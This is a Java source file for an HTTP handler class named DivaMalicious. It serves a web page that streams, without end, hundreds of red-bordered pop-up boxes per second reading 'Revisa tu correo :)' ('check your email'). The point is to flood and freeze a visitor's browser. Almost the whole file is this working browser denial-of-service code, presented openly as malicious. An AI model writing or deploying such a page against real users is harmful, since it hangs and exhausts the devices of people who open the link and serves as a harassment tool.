package com.diva.diva;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import java.io.IOException;
import java.io.OutputStream;
import java.nio.charset.StandardCharsets;

public class DivaMalicious implements HttpHandler {

    @Override
    public void handle(HttpExchange ex) throws IOException {
        ex.getResponseHeaders().set("Content-Type", "text/html; charset=UTF-8");
        ex.getResponseHeaders().set("Cache-Control", "no-store, no-cache, must-revalidate");
        ex.getResponseHeaders().set("Connection", "keep-alive");
        ex.sendResponseHeaders(200, 0); // Streaming chunked habilitado

        OutputStream os = ex.getResponseBody();

        String header = """
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <style>
                    body { margin: 0; overflow: hidden; background: #000; font-family: Arial, sans-serif; }
                    .alert-box {
                        position: fixed;
                        width: 90%; height: 12%;
                        background: #fff;
                        border: 4px solid #f00;
                        border-radius: 15px;
                        box-shadow: 0 0 30px rgba(255,0,0,0.8);
                        display: flex; align-items: center; justify-content: center;
                        font-size: 1.8rem; font-weight: 900; color: #000;
                        z-index: 9999;
                        user-select: none;
                        will-change: transform, opacity;
                        animation: popIn 0.05s ease-out forwards;
                    }
                    @keyframes popIn {
                        0% { transform: scale(0); opacity: 0; }
                        100% { transform: scale(1); opacity: 1; }
                    }
                </style>
            </head>
            <body>
            """;
        os.write(header.getBytes(StandardCharsets.UTF_8));
        os.flush();

        int contador = 0;
        while (true) {
            try {
                StringBuilder chunk = new StringBuilder();
                for (int i = 0; i < 100; i++) {
                    double top = Math.random() * 85;
                    double left = Math.random() * 85;
                    // CORRECCIÓN CRÍTICA: Inyección de DIVs con clase y estilos inline
                    chunk.append(String.format(
                        "<div class=\"alert-box\" style=\"top:%.1f%%;left:%.1f%%;\">Revisa tu correo :)</div>\n",
                        top, left
                    ));
                }
                contador += 100;

                os.write(chunk.toString().getBytes(StandardCharsets.UTF_8));
                os.flush();

                Thread.sleep(5);

            } catch (InterruptedException e) {
                break;
            }
        }
    }
}